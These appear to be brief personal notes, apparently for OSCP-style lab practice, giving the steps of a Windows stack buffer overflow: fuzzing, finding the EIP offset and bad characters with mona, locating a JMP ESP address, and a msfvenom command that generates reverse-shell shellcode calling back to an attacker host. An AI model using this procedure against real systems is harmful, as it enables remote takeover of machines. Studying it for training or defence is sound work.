fuzzing.py

pattern create into payload
exploit.py
!mona findmsp -distance <length>
EIP offset into offset
retn BBBB
exploit.py

!mona bytearray -b "\x00\xa9\xcd\xd4"
badChars.py into payload
exploit.py
!mona compare -f C:\mona\oscp\bytearray.bin -a <address_in_esp>
	Remove results from payload
Repeat till unmodified

!mona jmp -r esp -cpb <badchars>
address into retn (reverse if Little Endian)

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "<BAD_CHARS>" -f c
into payload

padding = "\x90" * 16











\x00\xa9\xcd\xd4
